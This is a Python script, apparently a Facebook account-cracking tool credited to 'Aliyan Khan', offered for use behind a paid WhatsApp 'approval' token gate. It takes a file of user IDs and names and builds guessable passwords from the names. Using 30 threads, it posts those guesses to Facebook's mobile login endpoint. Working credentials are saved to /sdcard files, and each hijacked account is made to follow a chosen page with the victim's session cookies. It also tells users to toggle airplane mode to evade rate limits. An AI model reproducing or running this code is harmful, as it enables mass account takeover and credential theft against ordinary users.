#!/usr/bin/python3
import os,sys,re,time,random,json,string,requests,bs4
from concurrent.futures import ThreadPoolExecutor as ThreadPool

import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as xns
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;97m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 9; KSA-LX9 Build/HONORKSA-LX9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/337.0.0.32.118;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

def logo():
              print( """\033[1;91m' 
   ###    ##       #### ##    ##    ###    ##    ## 
  ## ##   ##        ##   ##  ##    ## ##   ###   ## 
 ##   ##  ##        ##    ####    ##   ##  ####  ## 
##     ## ##        ##     ##    ##     ## ## ## ## 
######### ##        ##     ##    ######### ##  #### 
##     ## ##        ##     ##    ##     ## ##   ### 
##     ## ######## ####    ##    ##     ## ##    ## 
""")

def reg():
    os.system('clear')
    logo()
    print ('')
    time.sleep(0.001) 
    try:
        to = open('/sdcard/Android/.bs7nt.txt', 'r').read()
    except (KeyError, IOError):
        reg2()
    r = requests.get('https://raw.githubusercontent.com/Famous-Hacker/XOSZ.txt/main/XOS.txt').text
    if to in r:
        time.sleep(2)
        python_java()
    else:
        os.system('clear')
        logo()
        print('')
        print ('\tApproved Not Detected')
        print ('')
        print (' \033[1;97mToken: ' + to)
        print(' WhatsApp : +923465719745')
        input('\033[1;97m Press Enter To Get Approval (PAID 300)')
        os.system('xdg-open https://wa.me/+923491383368?text=Assalamualaikum Sir Approve my Token and my Token :'+to)
        reg()

def reg2():
    os.system('clear')
    logo()
    print('')
    print ('\tApproval Not Detected')
    print('')
    id = uuid.uuid4().hex[:50]
    print (' Token : ' + id)
    print(' WhatsApp : +92365719745')
    input(' Press Enter To Get Approval (Paid 300) ')
    os.system('xdg-open https://wa.me/+923465719745?text=Hi Sir Can You Please approve my token :'+id)
    sav = open('/sdcard/Android/.bs7nt.txt', 'w')
    sav.write(id)
    sav.close()
    reg()

def hasil(OK,cp):
    if len(OK) != 0 or len(cp) != 0:
        print('\n\033[1;97m-----------------------------------------------')
        print('[%s+%s] \033[1;97mTOTAL OK : %s =>> \033[1;97mok.txt'%(O,O,str(len(ok))))
        print('-----------------------------------------------')
        input(f"\033[1;97mPress Enter To Go Back ")
        python_java()

def python_java():
    os.system('clear')
    logo()
    ipm = requests.get(url_ip).json() 
    IP = ipm["origin"]
    print(" \033[1;95m ---------------------------------------------");time.sleep(0.03)
    print(" \033[1;96m AUTHOR    :      \033[1;92mAliyan Khan")
    print(" \033[1;96m WP NMB    :      \033[1;92m+92 345 5660908")
    print(" \033[1;96m T34M      :       \033[1;92mAFTHZ")
    print(" \033[1;95m ---------------------------------------------");time.sleep(0.03)
    print(" \033[1;97m IP ADDRESS        [%s]\n"%(IP));time.sleep(0.01)
    print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
    print(" \033[1;95m     -TH3 UNB34T4BL3 B01 R3J3CT3D H3R3://")
    print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
    print('\033[1;93m[1] \033[1;97mStart Cloning')
    print('\033[1;93m[2] \033[1;97mExit ')
    print('\033[1;97m-----------------------------------------------')
    _Loda___ = input('\033[1;93m[•] \033[1;97mChoose : ')
    if _Loda___ in ('1', '01'):
        __xxx__().ALIYANKHAN(id)
    if _Loda___ in ('2', '02'):
        pass


class __xxx__:
    def __init__(self):
        self.id = []
    def ALIYANKHAN(self,id):
        os.system("clear")
        logo()
        self.cnt = input('\033[1;93m[•] \033[1;97mFile Name :\033[1;92m ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        logo()
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            self.__pler__()
        else:
            print(' [!] Choose Correct One');
            self.ALIYANKHAN(id)
    def __metode__(self, user, __chi__, chachaji):
        global ok,cp,loop
        sys.stdout.write(f"\r\x1b[1;97m[\x1b[1;96mALIYAN\x1b[1;96m] {loop}\x1b[1;93m/\x1b[1;97m{len(self.id)} \x1b[1;92mOK\x1b[1;97m-:\x1b[1;92m{len(ok)}")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header = {
                    "Host":chachaji,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A725F/A725FXXU4BVB4) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/92.0.4515.166 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://m.facebook.com/",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                r = session.get(f"https://{chachaji}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":chachaji,
                    "cache-control":"max-age=0",
                    "upgrade-insecure-requests":"1",
                    "origin":"https://"+chachaji,
                    "content-type":"application/x-www-form-urlencoded",
                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A725F/A725FXXU4BVB4) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/92.0.4515.166 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with":"XMLHttpRequest",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://"+chachaji+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                po = session.post(f"https://{chachaji}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f'\r{H} [ALIYAN-OK] {user} | {pw}')
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('/sdcard/ALIYAN-OK.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s \033[1;91m[ALIYAN-CP] %s | %s ' % (K,user,pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('/sdcard/ALIYAN-CP.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    print('\r%s \033[1;96m[ALIYAN-CP] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('/sdcard/ALIYAN-CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, chachaji)

    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/TH3.UNB3TBL3.LRK4.R3J3CTEDH3R3', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):
        print('\033[1;93m[1] \033[1;97mCrack Auto Pass \033[1;92m{Slow}')
        print('\033[1;93m[2] \033[1;97mCrack Digit Passwords \033[1;92m{3-PASS}')
        print('\033[1;93m[3] \033[1;97mCrack Name + Digit Pass \033[1;92m{3-PASS}')
        print('\033[1;93m[4] \033[1;97mCrack With Fullname Pass \033[1;92m{Fast}')
        print('\033[1;93m[5] \033[1;97mCrack With Fullname+Digit Pass \033[1;92m{Slow}')
        print('\033[1;97m-----------------------------------------------')
        chi = input('\033[1;93m[•] \033[1;97mChoose : \033[1;92m')
        if chi == '':
            print('\nSelect Correct One')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system('clear')
            logo()
            print('')
            print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
            print(' \033[1;97m TOTAL IDZ : %s%s' %(len(self.id),O))
            print(' \033[1;97m CRACK H4S B33N ST4RT3D')
            print(' \033[1;97m US3  (Airplane) M0D EV3RY 5 MNT FOR SP33D UP:))')
            print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
            print('')
            with xns(max_workers=30) as ssbworld:
                for aziz in self.id: 
                    try:
                        uid, name = aziz.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345",xz[0]+"1234"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345",xz[0]+"1234"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
            os.system("clear")
            logo()
            p1 = input('\033[1;97mPass 01 : \033[1;92m')
            p2 = input('\033[1;97mPass 02 : \033[1;92m')
            p3 = input('\033[1;97mPass 03 : \033[1;92m')
            os.system('clear')
            logo()
            print('')
            print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
            print(' \033[1;97m TOTAL IDZ : %s%s' %(len(self.id),O))
            print(' \033[1;97m CR4CK H4S B33N ST4RT3D')
            print(' \033[1;97m US3  (Airplane) M0D EV3RY 5 MNT FOR SP33D UP:))')
            print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
            print('')
            with xns(max_workers=30) as ssbworld:
                for aziz in self.id: 
                    try:
                        uid, name = aziz.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [p1, p2, p3]
                        else:
                            pwx = [p1, p2, p3]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('3', '03'):
            os.system("clear")
            logo()
            p1 = input('\033[1;97mName + : \033[1;92m')
            p2 = input('\033[1;97mName + : \033[1;92m')
            p3 = input('\033[1;97mName + : \033[1;92m')
            os.system('clear')
            logo()
            print('')
            print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
            print(' \033[1;97m TOTAL IDZ : %s%s' %(len(self.id),O))
            print(' \033[1;97m CR4CK H4S B33N ST4RT3D')
            print(' \033[1;97m US3  (Airplane) M0D EV3RY 5 MNT FOR SP33D UP:))')
            print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
            with xns(max_workers=30) as ssbworld:
                for aziz in self.id: 
                    try:
                        uid, name = aziz.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [xz[0]+p1, xz[0]+p2, xz[0]+p3]
                        else:
                            pwx = [xz[0]+p1, xz[0]+p2, xz[0]+p3]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('4', '04'):
            os.system('clear')
            logo()
            print('')
            print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
            print(' \033[1;97m TOTAL IDZ : %s%s' %(len(self.id),O))
            print(' \033[1;97m CR4CK H4S B33N ST4RT3D')
            print(' \033[1;97m US3  (Airplane) M0D EV3RY 5 MNT FOR SP33D UP:))')
            print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
            print('')
            with xns(max_workers=30) as ssbworld:
                for aziz in self.id: 
                    try:
                        uid, name = aziz.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+xz[1]]
                        else:
                            pwx = [name, xz[0]+xz[1]]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('5', '05'):
            os.system('clear')
            logo()
            print('')
            print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
            print(' \033[1;97m TOTAL IDZ : %s%s' %(len(self.id),O))
            print(' \033[1;97m CR4CK H4S B33N ST4RT3D')
            print(' \033[1;97m US3  (Airplane) M0D EV3RY 5 MNT FOR SP33D UP:))')
            print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
            print('')
            with xns(max_workers=30) as ssbworld:
                for aziz in self.id: 
                    try:
                        uid, name = aziz.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [xz[0]+xz[1]+"123", xz[0]+xz[1]+"1234", xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786"]
                        else:
                            pwx = [xz[0]+xz[1]+"123", xz[0]+xz[1]+"1234", xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        else:
            print('\n Wrong Input')
            self.__pler__()

class load:
    def __init__(self):
        _ = ''
        __ = int('30')
        ___ = int('0')
        __ -= 1
        ___ += 1
        for t in range(int("1")):
            print('\r Please Wait ....')
            sys.stdout.flush()
            time.sleep(0.1)
        print('\n')

if __name__=='__main__':
    reg()

